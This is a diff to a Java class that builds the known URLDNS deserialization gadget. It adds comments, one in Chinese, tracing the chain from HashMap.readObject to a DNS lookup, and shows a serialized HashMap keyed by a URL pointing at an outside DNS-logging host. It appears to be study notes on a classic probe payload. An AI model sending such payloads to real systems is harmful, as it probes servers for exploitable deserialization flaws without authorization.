@@ -27,6 +27,14 @@ public class URLDNS {
         field.set(obj, value);
     }
 
+    /**
+     * 1. HashMap->readObject()
+     * 2. HashMap->hash()
+     * 3. URL->hashCode()
+     * 4. URLStreamHandler->hashCode()
+     * 5. URLStreamHandler->getHostAddress()
+     * 6. InetAddress->getByName()
+     */
     public static void main(String []args) throws Exception {
         String url = "http://dns.675ba661.y7z.xyz";
 
@@ -38,6 +46,7 @@ public class URLDNS {
         URL u = new URL(null, url, handler); // URL to use as the Key
         ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
 
+        //设置这个URL对象的hashCode为初始值-1，这样反序列化时将会重新计算其hashCode，才能触发到后⾯面的DNS请求，否则不会调⽤用URL->hashCode()
         setFieldValue(u, "hashCode", -1);
 
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
